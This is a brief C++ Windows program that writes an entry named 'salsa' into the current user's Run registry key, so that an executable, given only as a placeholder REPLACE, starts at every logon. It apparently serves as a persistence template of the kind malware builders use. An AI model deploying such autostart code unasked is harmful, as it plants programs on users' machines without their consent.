#include <windows.h>
#include <string.h>
#include <iostream>
#include <conio.h>

char* tita;
const char* exe;
const char* exe2;

using namespace std;

int main() {
    exe = REPLACE;
    HKEY hkey = NULL;
    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey,(LPCSTR)"salsa", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
        RegCloseKey(hkey);
    }
}





